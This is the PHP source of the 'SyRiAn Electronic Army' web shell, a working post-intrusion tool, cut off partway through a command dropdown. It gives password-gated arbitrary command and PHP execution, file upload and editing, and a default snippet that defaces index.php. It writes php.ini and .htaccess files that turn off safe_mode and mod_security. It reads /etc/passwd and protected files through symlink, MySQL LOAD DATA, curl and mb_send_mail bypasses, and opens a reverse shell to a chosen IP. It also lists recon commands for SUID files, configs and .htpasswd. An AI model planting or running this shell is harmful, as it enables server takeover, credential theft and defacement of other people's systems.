<?php
# Bypass SuHosin
# Virtual
# users 6 ID /etc/passwd

$user = 'SEA'; 
$pass = 'SEA'; 
$uselogin = 1;
$sh3llColor = "green";

# MySQL Info ---------
$DBhost = "localhost";
$DBuser = "root";
$DBpass = "root";
#---------------------
session_start();
error_reporting(0);
set_magic_quotes_runtime(0);
set_time_limit(0);
ignore_user_abort(TRUE);
ini_restore("safe_mode");
ini_restore("open_basedir");
ini_set('max_execution_time',0);
ini_set('output_buffering',0);
ini_set('safe_mode','Off');

// Set Current Directory
if(!$_POST && !$_SESSION['curDir']) {
	$dir = getcwd();
	$_SESSION['curDir'] = $dir;
} else if(empty($_POST['curDir'])) {
	$dir = $_SESSION['curDir'];
} else {
	$dir = filter($_POST['curDir']);
	$_SESSION['curDir'] = $dir;
}
// Set Dir Mode
if($_GET['dir_mode']) {
	$dir_mode = $_GET['dir_mode'];
	$_SESSION['dir_mode'] = $dir_mode;
} else { 
	$dir_mode = $_SESSION['dir_mode'];
}

// Set Usable Command
if($_POST['exe_method']) {
	$exec_method = $_POST['exe_method'];
} else {
	$exec_method = "exec";
}
# Logout 
if($_POST['logout']) {
	print '<script>document.cookie="user=;";document.cookie="pass=;";</script>';
	print '<script>document.location = "'.$_SERVER['PHP_SELF'].'";</script>';
}
if(strlen($dir)>1 && $dir[1]==":"){$os = "Windows";}else {$os = "Linux";}
if($_GET['info']){phpinfo();}
$safeMode = SafeMode();
$server = substr($SERVER_SOFTWARE,0,120);
$daemon = "";
?>
<html>
<head>
<title>SyRiAn Electronic Army Shell :: SEA Shell</title>
<link rel="shortcut icon" href='http://i40.tinypic.com/2rpuped.png' />
<meta http-equiv=Content-Type content=text/html; charset=UTF-8>
<?php echo CSS($sh3llColor); ?>

</head>
<body dir='ltr'>
<?php
# ---------------------------------------#
#             Authentication             #
#----------------------------------------#
if ($uselogin ==1) {
	if($_COOKIE["user"] != $user or $_COOKIE["pass"] != md5($pass)) {
		if($_GET) {$user = $_GET['user'];$pass = $_GET['pass'];}
		if($_POST['usrname']==$user && $_POST['passwrd']==$pass){
			print'<script>document.cookie="user='.$_POST['usrname'].';";document.cookie="pass='.md5($_POST['passwrd']).';";</script>';
		} else {
			if($_POST['usrname']){
				print'<script>alert("Go and play in the street man !!");</script>';
			}
?>
<br><br>
			<center><img src="http://i40.tinypic.com/2rpuped.png"><br />
			<sy>SyRiAn Electronic Army</sy>
			</center><br />
			<div align="center">
				<form method="POST" name="login_form" onSubmit="if(this.usrname.value==''){return false;}">
				<input dir="ltr" name="usrname" id="username" value="" type="text"  size="30" onBlur="Blur('username','userName');" onClick="Clear('username','userName');"/><br>
				<input dir="ltr" name="passwrd" id="password" value="" type="password" size="30" onFocus="Focus(2);" /><br>
				<input type="submit" value=" Login  " name="login" />
				</form>
			</div>
            <?php
			footer();
			exit;
		}
	}
}
?>
<table cellpadding='0' cellspacing='0' width='100%'>
	<tr>
    	<td width='160'>
    	<center><form method="post"><input type="submit" value="Logout" name="logout" id="logout" /></form></center>
			<a href="<?php echo $_SERVER['PHP_SELF']; ?>"><img border='0' src='http://i40.tinypic.com/2rpuped.png' width='100%' height='100%'></a><br>
			<center>SyRiAn Electronic Army
			<p></p>
				<select name="dir_mode" id="dir_mode" onchange="change_dir_mode();">
					<option value="cmd" <?php if($dir_mode == "cmd") {echo "selected";} ?> >CMD</option>
					<option value="php" <?php if($dir_mode == "php") {echo "selected";} ?>>PHP</option>
				</select>
			</center>
      </td>
	  <td>
      <form method="post">
<table width='100%' style="border:none; padding:2px;" >
    <tr>
    	<td width='103'>System</td>
    	<td width="323"><?php echo $os; ?></td>
    	<td width="90">Apache Modules</td>
    	<td width="278"><select ><?php 
    	if(function_exists("apache_get_modules")) {
			foreach (apache_get_modules() as $module) {
				echo "<option>".$module."</option>";
			}
    	}else {
    		echo "<option>NONE</option>";
    	}
    	?></select></td>
    </tr>
    <tr>
      <td>uname </td>
      <td><a href='http://www.google.com/search?q=<?php echo php_uname(); ?>' target='_blank'><u><?php echo php_uname(); ?></u></a></td>
      <td>Curl</td>
      <td><?php echo Curl(); ?></td>
    </tr>
    <tr>
        <td>pwd</td>
        <td><?php echo getcwd(); ?></td>
        <td>Open Basedir</td>
        <td><?php echo openBaseDir(); ?></td>
    </tr>
    <tr>
        <td>whoami</td>
        <td><?php echo get_current_user(); ?></td>
        <td>Magic_Quotes</td>
        <td><?php echo magicQouts(); ?></td>
    </tr>
        <tr>
          <td>Server</td>
          <td><?php echo $server; ?></td>
          <td>Register Globals</td>
          <td><?php echo RegisterGlobals(); ?></td>
        </tr>
        <tr>
          <td>Server Name</td>
          <td><?php echo $_SERVER['HTTP_HOST']; ?></td>
          <td>Gzip</td>
          <td><?php echo Gzip(); ?></td>
        </tr>
        <tr>
          <td>Your IP</td>
          <td><?php echo GetRealIP(); ?></td>
          <td>Oracle</td>
          <td><?php echo Oracle(); ?></td>
        </tr>
        <tr>
          <td>Server IP</td>
          <td><a href='http://bing.com/search?q=ip:<?php echo gethostbyname($_SERVER["HTTP_HOST"]); ?>&go=&form=QBLH&filt=all' target='_blank'><u><?php echo gethostbyname($_SERVER["HTTP_HOST"]); ?></u></a> [<a href="http://whois.webhosting.info/<?php echo gethostbyname($_SERVER["HTTP_HOST"]); ?>" target='_blank' />Reverse IP]</td>
          <td>MSQL</td>
          <td><?php echo MSQL(); ?></td>
        </tr>
        <tr>
          <td>PHP Version</td>
          <td><a href='javascript:openPHPInfo();'><u><?php echo phpversion(); ?></u></a></td>
          <td>MySQL</td>
          <td><?php echo MySQL2()." ".mysql_get_server_info(); ?></td>
        </tr>
        <tr>
          <td>Safe Mode</td>
          <td><?php echo $safeMode; ?></td>
          <td>MySQLi</td>
          <td><?php echo MysqlI(); ?></td>
        </tr>
        <tr>
        <td>disable functions</td>
        <td><select name="disableFunctions"><?php
		$funArray = DisableFunctions();
		$funArray = explode(",",$funArray);
		sort($funArray);
		foreach($funArray as $fun){echo "<option value='".$fun."'>".$fun."</option>";}
		?></select>
          <input name="STOP_Execute" type="submit" id="STOP_Execute" value="Turn Off" />
          </td>
        <td>MsSQL</td>
        <td><?php echo MsSQL(); ?></td>
        </tr>
</table>
&nbsp;   [<a href='http://www.md5decrypter.co.uk/' target='_blank'>MD5 Cracker</a>]
[<a href='http://www.md5decrypter.co.uk/sha1-decrypt.aspx' target='_blank'>SHA1 Cracker</a>]
[<a href='http://www.md5decrypter.co.uk/ntlm-decrypt.aspx' target='_blank'>NTLM Cracker</a>]
<input name="USERS_1" type="submit" id="USERS_1" value="Users [1]" />
<input name="USERS_2" type="submit" id="USERS_2" value="Users [2]" />
<input name="USERS_3" type="submit" id="USERS_3" value="Users [3]" />
<input name="USERS_4" type="submit" id="USERS_4" value="Users [4]" />
<input name="USERS_5" type="submit" id="USERS_5" value="Users [5]" />
<input type="submit" name="forbidden_bypass" id="forbidden_bypass" value="Forbidden" />
<input type="submit" name="find_755" id="find_755" value="Find 755" />
<br>
</form>
</table>

<form method="post">
<center>
<textarea cols="150" rows="20" name="result" >
<?php 
chdir($dir);
if($_POST['login'] || !$_POST){echo ScanDirs();}
else if($_POST['CMD_Execute']){if(empty($_POST['CMD_Line'])){echo scanDirs();}else {Exe(urldecode(filter($_POST['CMD_Line']))); }}
else if($_POST['PHP_Execute']){$eval = Evaluation(urldecode(filter($_POST['PHP_Line'])));}
else if($_POST['UPLOAD_Execute']) {
	for ($i = 0; $i < count($_FILES['uploadfile']['name']); $i++) {
		if($_FILES['uploadfile']['name'][$i] != '') {
			if(function_exists('copy')){$upload = copy($_FILES['uploadfile']['tmp_name'][$i], $_FILES['uploadfile']['name'][$i]);}
			else{$upload = move_uploaded_file($_FILES['uploadfile']['tmp_name'][$i], $_FILES['uploadfile']['name'][$i]);}
			if($upload) {echo "The File  ".$_FILES['uploadfile']['name'][$i]." Uploaded Successfully !
";	}
			else { echo "The File  ".$_FILES['uploadfile']['name'][$i]."  Can't Be Upload :( !
";}
		}
	}		
}
else if($_POST['EDIT_Execute']){$content = htmlspecialchars(file_get_contents(filter($_POST['Edit_Line'])));echo $content;}
else if($_POST['SAVE_Execute']) {
	$content = filter($_POST['result']);
	if(empty($content)){$content = " ";}
	if(GenerateFile($_POST['FILE_NAME'],$content)){echo "[+]Saved Success !! ";}else{echo "[-]Save Failed !";}
}
else if($_POST['READ_Execute']) {
	$path = urldecode(filter($_POST['READ_Line']));
	$file = fopen($path,'r+');
	if($_POST['READ_Type'] == "file"){echo htmlspecialchars(filter(FileF($path)));	}
	else if($_POST['READ_Type'] == "fgets"){while(($line = htmlspecialchars(filter(fgets($file)))) != false){echo $line;}}
	else if($_POST['READ_Type'] == "fgetss"){while(($line = htmlspecialchars(filter(fgetss($file)))) != false){echo $line;}}
	else if($_POST['READ_Type'] == "readfile"){echo htmlspecialchars(filter(readfile($path)));}
	else if($_POST['READ_Type'] == "fread"){echo htmlspecialchars(filter(fread($file,filesize($path))));}
	else if($_POST['READ_Type'] == "file_get_contents"){echo htmlspecialchars(filter(file_get_contents($path)));}
	else if($_POST['READ_Type'] == "tempnam"){echo htmlspecialchars(filter(TempnameF($path)));}
	else if($_POST['READ_Type'] == "copy"){echo htmlspecialchars(filter(CopyF($path)));}
	else if($_POST['READ_Type'] == "mb_send_mail"){echo htmlspecialchars(filter(mbSendEmail($path)));}
	else if($_POST['READ_Type'] == "highlight_file"){echo htmlspecialchars(filter(highlightFile($path)));}
	else if($_POST['READ_Type'] == "curl"){echo htmlspecialchars(filter(CurlFileRead($path)));}
	else if($_POST['READ_Type'] == "imap"){echo htmlspecialchars(filter(ImapF($path)));}
	else if($_POST['READ_Type'] == "id"){echo htmlspecialchars(filter(ReadId($path)));}
	else if($_POST['READ_Type'] == "show_source"){echo htmlspecialchars(filter(show_source($path)));}
	else if($_POST['READ_Type'] == "mysql"){echo htmlspecialchars(filter(MySQLReader($path)));}
	else if($_POST['READ_Type'] == "mysqli"){echo htmlspecialchars(filter(MySQLIReader($path)));}
	else if($_POST['READ_Type'] == "symlink"){echo htmlspecialchars(filter(SymlinkF($path)));}
	else if($_POST['READ_Type'] == "ioncube"){echo htmlspecialchars(filter(ioncube_read_file($path)));}
	else if($_POST['READ_Type'] == "error_log"){echo htmlspecialchars(filter(ErrorLog($path)));}
	else if($_POST['READ_Type'] == "include"){echo htmlspecialchars(filter(IncludeReader($path)));}
}
else if($_POST['STOP_Execute']) {
$genTry = GenerateFile("php.ini","
safe_mode = Off
disable_functions = NONE
safe_mode_gid = OFF
open_basedir = OFF");
	if($genTry){echo "[+] php.ini Has Been Generated Successfully 
";}
	else {echo "[-] Failed to generate php.ini file !! 
";}
	
	$genTry = GenerateFile(".htaccess","
<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
SecFilterCheckURLEncoding Off
SecFilterCheckCookieFormat Off
SecFilterCheckUnicodeEncoding Off
SecFilterNormalizeCookies Off
</IfModule>
<Limit GET POST>
order deny,allow
deny from all
allow from all
</Limit>
<Limit PUT DELETE>
order deny,allow
deny from all
</Limit>
SetEnv PHPRC ".getcwd()."/php.ini
	");
	if($genTry){echo "[+] .htaccess Has Been Generated Successfully 
";}
	else {echo "[-] Failed to generate .htaccess file !! 
";}
}
else if($_POST['CON_Type'] == "socks") {
	$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
	if($sock < 0){echo "[-] failed to create socket.";}
	else {
		$result = socket_connect($sock, filter(trim($_POST['ip'])), filter(trim($_POST['port'])));
		if($result < 0){echo "[-] failed to connect back to host:".$_GET['host'];}
		else {
			$send_var = "\n\n -== SyRiAn Electronic Army , Back Connection ==-\n$";
			socket_write($sock, $send_var, strlen($send_var));
			while($input = socket_read($sock, 10000)) {
				socket_write($sock, shell_exec($input), 12000);
			}
		}
	}
} else if($_POST['CON_Type'] == "fsockopen") {
	$ip = filter(trim($_POST['ip']));
	$port = filter(trim($_POST['port']));
	if (!empty($ip)) { 
		$con_fsockopen = fsockopen($ip , $port , $errno, $errstr ); 
		if (!$con_fsockopen){ 
			$result = "Error: didnt connect !!!"; 
		} else { 
			$newLine="\n";           
			fputs ($con_fsockopen ,"\n\n -== SyRiAn Electronic Army , Back Connection ==-\n$");
			fputs($con_fsockopen , system("uname -a") .$newLine );
			fputs($con_fsockopen , system("pwd") .$newLine );
			fputs($con_fsockopen , system("id") .$newLine.$newLine );
			while(!feof($con_fsockopen)){  
				fputs ($con_fsockopen); 
				$one="[$";
				$two="]";
				$result= fgets ($con_fsockopen, 8192); 
				$message = $result; 
				fputs ($con_fsockopen, $one. system("whoami") .$two. " " .$message."\n"); 
			} 
			fclose ($con_fsockopen); 
		}
	}
}
else if($_POST['USERS_1']){echo GetUsers1();}
else if($_POST['USERS_2']) {
	 $array = GetUsers2();
	 foreach($array as $line)
	 {echo $line."
";}	
}
else if($_POST['USERS_3']) {
	 $array = GetUsers3();
	 foreach($array as $line)
	 {echo $line."
";}	
}
else if($_POST['USERS_4']) {
	 $array = GetUsers4();
	 foreach($array as $line)
	 {echo $line."
";}	
} else if($_POST['USERS_5']){echo GetUsers5();}
else if($_POST['forbidden_bypass']) {
	mkdir("forbidden");
	chdir("forbidden");
	$forbidden_htaccess = GenerateFile(".htaccess", "
DirectoryIndex sea.txt
HeaderName sea.txt
ReadmeName sea.txt
footerName sea.txt
ErrorDocument 404 /404.html 
404.html = Symlinked sea.txt
Options all
ForceType text/plain
AddType text/plain .php 
AddType text/plain .html
AddHandler server-parsed .php
AddHandler txt .php
	");
	if($forbidden_htaccess) {
		echo "[+] make your symlink as sea.txt in /forbidden/ folder and find the url /forbidden/sea.txt or /forbidden/";
	} else {
		echo "[-] error with generating .htaccess file.";
	}
} else if($_POST['find_755']) {
	Exe("ls -dl /home/*/public_html/ | grep drwxr-xr-x");
}
?></textarea>
<?php
if($_POST['EDIT_Execute']){echo "<input type='submit' value='Save' name='SAVE_Execute' class='Save' />
<input type='hidden' name='FILE_NAME' value='".$_POST['Edit_Line']."' />
";}
?>
</center></form>
<table width='100%'>
	<tr valign="top">
		<td width='30%'>
       <!-- Command Line -->
       <form method='POST' enctype="multipart/form-data">
	        <table height='72' border='0' id='Box' width="100%">
	       	  <tr>
	   		  <td width="4%" height="21" style="background-color:<?php echo $sh3llColor; ?>">&nbsp;</td>
	        		<td style="background-color:#666;padding-left:10px;">Edit File
	       		    <input name="EDIT_Execute" type="submit" id="EDIT_Execute" value="Edit" /></td>
	          </tr>
	            <tr>
	       		  <td height="45" colspan="2"><input type='text' name='Edit_Line' id='Edit_Line' value='<?php if($_POST['EDIT_Execute']){echo filter($_POST['Edit_Line']);}else {echo $dir;} ?>' size="70"></td>
	            </tr>
	        </table>
        </form>
        <!-- End Of Command Line-->
        
		</td>
        <td width='30%' height='30'>
         <!-- Command Line -->
         <form method='POST' enctype="multipart/form-data">
	       	  <table height='72' border='0' id='Box'>
	       	  <tr>
	   		  <td width="4%" height="21" style="background-color:<?php echo $sh3llColor; ?>">&nbsp;</td>
        		<td style="background-color:#666;padding-left:10px;">Command Line
        		<?php echo print_exe_method(); ?> 
   		    	<input name="CMD_Execute" type="submit" id="CMD_Execute" value="Execute" onClick="document.getElementById('CMD_Line').value = encodeURIComponent(document.getElementById('CMD_Line').value);">
	   		    </td>
          	</tr>
	            <tr>
	       		  <td height="45" colspan="2">
					<?php echo SelectCommand($os); ?> 
	                <input type='text' name='CMD_Line' id='CMD_Line' value='' size="70">
	              <input name="curDir" type="text" id="curDir" value="<?php if($_POST['Execute']){echo $_POST['curDir'];} else {echo getcwd();} ?>" size="70"></td>
	            </tr>
	        </table>
        </form>
        <!-- End Of Command Line-->
      </td>
        <td width='30%' height='30' valign="top">
        <!-- Commands Alias-->
        <form method='POST' enctype="multipart/form-data">
	        <table width='100%' height='72' border='0' id='Box'>
	       	  <tr>
	   		  <td width="4%" height="21" style="background-color:<?php echo $sh3llColor; ?>">&nbsp;</td>
	        		<td style="background-color:#666;padding-left:10px;">Upload Files      		  <span style="padding-left:10px;">
	        		  <input type='button' value='+' id='addUpload' size='5' onclick='addUploadInput();'>
	       		    <input name='UPLOAD_Execute' type='submit' id="UPLOAD_Execute" value='Upload Files'>
	        		</span></td>
	          </tr>
	            <tr>
	       		  <td height="45" colspan="2">
	              <input type='file' name='uploadfile[]'>
	   		      <input type='file' name='uploadfile[]'><div id='uploadInput'></div></td>
	            </tr>
	        </table>
        </form>
        <!-- End Of Commands Alias-->
		</td>
	</tr>
<tr valign="top">
		<td width='30%'>
       <!-- Commands Alias-->
       <form method='POST' enctype="multipart/form-data">
	        <table width='100%' height='72' border='0' id='Box'>
	       	  <tr>
	   		  <td width="4%" height="21" style="background-color:<?php echo $sh3llColor; ?>">&nbsp;</td>
	        		<td style="background-color:#666;padding-left:10px;">PHP Eval       		  
	       		    <input name="PHP_Execute" type="submit" id="PHP_Execute" onClick="document.getElementById('PHP_Line').value = encodeURIComponent(document.getElementById('PHP_Line').value);" value="Evaluate"></td>
	          </tr>
	            <tr>
	       		  <td height="45" colspan="2"><label for="PHP_Line"></label>
	   		      <textarea name="PHP_Line" id="PHP_Line" cols="50" rows="2"><?php if($_POST['PHP_Execute']){echo urldecode(filter($_POST['PHP_Line']));}else {echo '$file = fopen("index.php","w+");
	fwrite($file,"Hacked");
	fclose($file);';}
				?>
	              </textarea>
	   		      <br></td>
	          </tr>
	        </table>
        </form>
        <!-- End Of Commands Alias-->
		</td>
        <td width='30%' height='30'>
        <!-- Commands Alias-->
        <form method='POST' enctype="multipart/form-data">
        <table width='100%' height='72' border='0' id='Box'>
       	  <tr>
   		  <td width="4%" height="21" style="background-color:<?php echo $sh3llColor; ?>">&nbsp;</td>
        		<td style="background-color:#666;padding-left:10px;">Read Files
       		      
       		      <select name="READ_Type" >
       		        <option value="file" >file</option>
       		        <option value="fgets" >fgets</option>
       		        <option value="fgetss" >fgetss</option>
       		        <option value="readfile" >readfile</option>
       		        <option value="fread" >fread</option>
       		        <option value="show_source" >show_source</option>
       		        <option value="file_get_contents" >file_get_contents</option>
       		        <option value="tempnam" >tempnam</option>
       		        <option value="copy" >copy</option>
                    <option value="symlink" >Symlink</option>
       		        <option value="mb_send_mail" >mb_send_mail</option>
       		        <option value="highlight_file" >highlight_file</option>
       		        <option value="curl" >Curl</option>
       		        <option value="imap" >Imap</option>
       		        <option value="mysql" >MySQL</option>
                    <option value="mysqli" >MySQLI</option>
                    <option value="ioncube">Ion Cube</option>
                    <option value="error_log">Error_Log</option>
                    <option value="include">Include</option>
       		        <option value="id" >ID /etc/passwd</option>
   		          </select>
       		      <input name="READ_Execute" type="submit" id="READ_Execute" onClick="document.getElementById('READ_Line').value = encodeURIComponent(document.getElementById('READ_Line').value);" value="Read"></td>
          </tr>
            <tr>
       		  <td height="45" colspan="2"><input type='text' name='READ_Line' id='READ_Line' value='<?php if($_POST['READ_Execute']){echo urldecode(filter($_POST['READ_Line']));}else {echo $dir;} ?>' size="70"></td>
          </tr>
        </table>
        </form>
        <!-- End Of Commands Alias-->
  </td>
        <td width='30%' height='30' valign="top">
        <!-- Commands Alias-->
        <form method='POST' enctype="multipart/form-data">
        <table width='100%' height='72' border='0' id='Box'>
       	  <tr>
   		  <td width="4%" height="21" style="background-color:<?php echo $sh3llColor; ?>">&nbsp;</td>
        		<td style="background-color:#666;padding-left:10px;">Back Connection
       		    <input name='CON_Execute' type='submit' id="CON_Execute" value='Connect'></td>
          </tr>
            <tr>
       		  <td height="45" colspan="2"><input type="text" name="ip" value="<?php if($_POST['CON_Execute']){echo $_POST['ip']; }else {echo GetRealIP(); } ?>" />
   		      <input type="text" name="port" value="<?php if($_POST['CON_Execute']){echo $_POST['port']; }else {echo "443"; } ?>" />
   		      <select name="CON_Type" >
   		      	<option value="socks">SOCKS</option>
   		      	<option value="fsockopen">FSOCKOPEN</option>
   		      </select>
   		      </td>
            </tr>
        </table>
        </form>
        <!-- End Of Commands Alias-->
		</td>
	</tr>
</table>
<?php
function IncludeReader($path) {
	global $os;
	if($os == "Windows"){$slash = "\\";}else{$slash = "/";}
	$fileName = substr(strrchr($path,$slash),1);
	$includePath = substr($path,0,strpos($path,$fileName,0));
	ini_set("include_path",$includePath);
	include($fileName);
}
function GetUsers1() {
	return Exe('ls /var/mail');
}
function GetUsers2() {
	$array = array();
	$lines = file("/etc/passwd");
	foreach($lines as $nr=>$val) {
		$str = explode(":",$val);
		array_push($array,$str[0]);
	}
	return $array;
}
function GetUsers3() {
	$array = array();
	if ($dh = opendir("/home/"))  {
		while (($file = readdir($dh)) !== false)  {
			array_push($array,$file);
		}
		closedir($dh);
		return $array;
	}
}
function GetUsers4() {
	$dir = "/home/";
	$array = array();
     if ($dh = opendir($dir)) {
        $f = readdir($dh);
        while (($f = readdir($dh)) !== false) {
            $dh2=opendir($dir."/");
            $f2 = readdir($dh2);
            while (($f2 = readdir($dh2)) !== false) {
				$f2.="/";
				$dh3=opendir($dir.$f.$f2);
				$f3 = readdir($dh3);
				while (($f3 = readdir($dh3)) !== false) {
					array_push($array,$f3);
				}
			}
        }
        closedir($dh);
     	return $array;
	 }	
}
function GetUsers5(){
	return realpath('/etc/passwd');
}
function ErrorLog($path){
	$tempFile = uniqid();
	if(get_magic_quotes_gpc() != 0){$path = addslashes($path);}
	error_log(file_get_contents($path), 3, $tempFile);
	$content = file_get_contents($tempFile);
	unlink($tempFile);
	return $content;	
}
function SymlinkF($path) {
	$tempFile = uniqid();
	if(function_exists('symlink')) {
		symlink($path,$tempFile);
		$content = file_get_contents($tempFile);
		unlink($tempFile);
		return $content;
	}
}
function MySQLReader($path) {
	global $DBhost,$DBuser,$DBpass;
	if(get_magic_quotes_gpc() != 0){$path = addslashes($path);}
	$con = mysql_connect($DBhost,$DBuser,$DBpass);
	mysql_query("CREATE DATABASE a");
	mysql_query("CREATE TABLE a.a (a varchar(1024))");
	mysql_query("GRANT SELECT,INSERT ON a.a TO '".$DBuser."'");
	mysql_query("LOAD DATA LOCAL INFILE '".$path."' INTO TABLE a.a") or die(mysql_error());
	$result = mysql_query("SELECT a FROM a.a");
	while(list($row) = mysql_fetch_row($result)){print $row . chr(10);}
	mysql_query("DROP DATABASE a");
}
function MySQLIReader($path) {
	global $DBhost,$DBuser,$DBpass;
	if(get_magic_quotes_gpc() != 0){$path = addslashes($path);}
	$con = mysql_connect($DBhost,$DBuser,$DBpass);
	mysql_query("CREATE DATABASE a");
	mysql_query("CREATE TABLE a.a (a varchar(1024))");
	
	function r($fp, &$buf, $len, &$err) {
      print fread($fp, $len);
	}
	$m = new mysqli($DBhost, $DBuser, $DBpass, 'a');
	$m->options(MYSQLI_OPT_LOCAL_INFILE, 1);
	$m->set_local_infile_handler("r");
	$m->query("LOAD DATA LOCAL INFILE '".$path."' INTO TABLE a.a");
	$m->close();
}
function DBConnect($host,$user,$pass,$db) {
	$connect = mysql_pconnect($host,$user,$pass);
	if(!$connect){echo "Can't Connect to [ ".$host." ] [ ".$user." ] [ ".$pass." ]"; return false;	}
	else {
		$tryToSelectDB = mysql_select_db($db,$connect);
		if(!$tryToSelectDB){echo "Can't Enter The Database [ ".$db." ]"; return false;		}
		else{return true; return $connect;}
	}
}
function ReadId($path) {
	for($uid=0;$uid<60000;$uid++) {   
		$ara = posix_getpwuid($uid);
		if (!empty($ara)){while (list ($key, $val) = eah($ara)){$content .= $val;}
		}
	}
	return $content;
}
function ImapF($path) {
	$stream = imap_open($path, "", "");
	$str = imap_body($stream, 1);
	imap_close($stream);
	return $str;
}
function FileF($path) {
	$lines = file($path); foreach($lines as $line){$content .= $line;}
	return $content;
}
function CopyF($path) {	
	$tempFile = md5(uniqid()).".bb";
	copy($path,$tempFile);
	$content = file_get_contents($tempFile);
	unlink($tempFile);
	return $content;
}
function fgetssF($path) {
	while(($line = fgetss($path)) != false){$content .= $line;}
	return $content;
}
function highlightFile($path) {
	return highlight_file($path);
}
function mbSendEmail($path) {
	if(function_exists('mb_send_mail')) {
		$tempFile = uniqid();
		$additional_param = "-C ".$path." -X ".getcwd()."/".$tempFile;
		mb_send_mail("email@example.com", NULL, NULL, NULL, $additional_param);
		$content = file_get_contents($tempFile);
		unlink($tempFile);
		return $content;
	}
}
function DeleteFile($fileName) {
	global $os;
	if(function_exists('unlink'))
	{$delete = unlink($fileName);}
	if((!$delete) && ($os == 'Windows'))
	{$delete = Exe("del $fileName"); }
	else if((!$delete) && ($os == 'Linux'))
	{$delete = Exe("rm -f $fileName");}
	if($delete){return true;}else{return false;}
}
function CurlFileRead($path) {
	$ch = curl_init("file://".$path."\x00".__FILE__);
	var_dump(curl_exec($ch));
}
function FReadF($path) {
	$file = fopen($path,'r+'); //Open The File
	if(function_exists('fread')){htmlspecialchars(fread($file,filesize($file)));}
	fclose($file);
}
function TempnameF($path) {
	global $dir;
	$temp = tempnam($dir, "cx");
	if(copy("compress.zlib://".$path, $temp)) {
		$handler = fopen($temp, "r");
		$readFile = fread($handler, @filesize($temp));
		fclose($handler);
		$content .= htmlspecialchars($filename);
		$content .= nl2br(htmlspecialchars($readFile));
		$content .= htmlspecialchars($filename);
		unlink($temp);
		return $content;
	} 	
}
function Evaluation($eval) {
	$eval = str_replace(array("<?php","<?","?>"),"",$eval);
	$eval = eval($eval);
	if($eval){return true;}else{return false;}
}
function Oracle() {
	if(function_exists('ocilogon')){$oracle = '<font color="red">ON</font>';}
	else {$oracle = '<font color="green">OFF</font>';}return $oracle;
}
function MsSQL() {
	if(function_exists('mssql_connect')){$msSQL = '<font color="red">ON</font>';}
	else {$msSQL = '<font color="green">OFF</font>';}return $msSQL;
}
function MySQL2() {
	$mysql_try = function_exists('mysql_connect');
	if($mysql_try){$mysql = '<font color="red">ON</font>';}
	else {$mysql = '<font color="green">OFF</font>';}return $mysql;
}
function MSQL() {
	if (function_exists('msql_connect')){$mSql = '<font color="red">ON</font>';}
	else {$mSql = '<font color="green">OFF</font>';}return $mSql;
}
function MysqlI() {
	if (function_exists('mysqli_connect')){$mysqli = '<font color="red">ON</font>';}
	else {$mysqli = '<font color="green">OFF</font>';}return $mysqli;
} 
function Gzip() {
	if (function_exists('gzencode')){$gzip = '<font color="red">ON</font>';}
	else {$gzip = '<font color="green">OFF</font>';}return $gzip;
}
function openBaseDir() {
	$openBaseDir = ini_get("open_basedir");
	if (!$openBaseDir){$openBaseDir = '<font color="green">OFF</font>';}
    else {$openBaseDir = '<font color="red">ON</font>';}	
	return $openBaseDir;
}
function Curl() {
	if(extension_loaded('curl')){$curl = '<font color="red">ON</font>';}
	else{$curl = '<font color="green">OFF</font>';}return $curl;
}
function magicQouts() {
	if(function_exists('get_magic_quotes_gpc')){$mag = get_magic_quotes_gpc();}
	if (empty($mag)){$mag = '<font color="green">OFF</font>';}
	else {$mag= '<font color="red">ON</font>';}return $mag;
}
function SafeMode() {
	$safe_mode = ini_get("safe_mode");
	if (!$safe_mode){$safe_mode = '<font color="green">OFF</font>';}
    else {$safe_mode = '<font color="red">ON</font>';}
	return $safe_mode;
}
function DisableFunctions() {
	$disfun = ini_get('disable_functions');
	if (empty($disfun)){$disfun = '<font color="green">NONE</font>';}return $disfun;
}
function RegisterGlobals() {
	if(ini_get('register_globals')){$registerg= '<font color="red">ON</font>';}
	else{$registerg= '<font color="green">OFF</font>';}return $registerg;
}
function GetRealIP() {
    if (getenv(HTTP_X_FORWARDED_FOR)){$ip=getenv(HTTP_X_FORWARDED_FOR);} 
	elseif (getenv(HTTP_CLIENT_IP)){$ip=getenv(HTTP_CLIENT_IP);}
	else {$ip=getenv(REMOTE_ADDR);}
    return $ip;
}
function SelectCommand($os) {
	global $os;
	if($os == 'Windows') {
		echo "
		<select name='alias' id='alias' onChange='AddAlias();' >
		<option value=''>NONE</option>	
		<option value='dir' >List Directory</option>
		<option value='dir /s /w /b index.php'>Find index.php in current dir</option>
		<option value='dir /s /w /b *config*.php'>Find *config*.php in current dir &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  &nbsp;  &nbsp;  &nbsp;  &nbsp;  &nbsp;</option>
		<option value='netstat -an'>Show active connections</option>
		<option value='net start'>Show running services</option>
		<option value='tasklist'>Show Pro</option>
		<option value='net user'>User accounts</option>
		<option value='net view'>Show computers</option>
		<option value='arp -a'>ARP Table</option>
		<option value='ipconfig /all'>IP Configuration</option>
		<option value='netstat -an'>netstat -an</option>
		<option value='systeminfo'>System Informations</option>
		<option value='getmac'>Get Mac Address</option>
		</select>
		";
	}
	else {
		echo "
		<select name='alias' id='alias' onChange='AddAlias();' >
		<option value=''>NONE</option>	
		<option value='ls -la'>List dir</option>
		<option value='cat /etc/hosts'>IP Addresses</option>
		<option value='cat /proc/sys/vm/mmap_min_addr'>Check MMAP</option>
		<option value='lsattr -va'>list file attributes on a Linux second extended file system</option>
		<option value='netstat -an | grep -i listen'>show opened ports</option>
		<option value='find / -type f -perm -04000 -ls'>find all suid files</option>
		<option value='find . -type f -perm -04000 -ls'>find suid files in current dir</option>
		<option value='find / -type f -perm -02000 -ls'>find all sgid files</option>
		<option value='find . -type f -perm -02000 -ls'>find sgid files in current dir</option>
		<option value='find / -type f -name config.inc.php'>find config.inc.php files</option>
		<option value='find / -type f -name \"config*\"'>find config* files</option>
		<option value='find . -type f -name \"config*\"'>find config* files in current dir</option>
		<option value='find / -perm -2 -ls'>find all writable folders and files</option>
		<option value='find . -perm -2 -ls'>find all writable folders and files in current dir</option>
		<option value='find / -type f -name service.pwd'>find all service.pwd files</option>
		<option value='find . -type f -name service.pwd'>find service.pwd files in current dir</option>
		<option value='find / -type f -name .htpasswd'>find all .htpasswd files</option>
		<option value='find . -type f -name .htpasswd'>find .htpasswd files in current dir</option>
		<option value='find / -type f -name .bash_history'>find all .bash_history files</option>
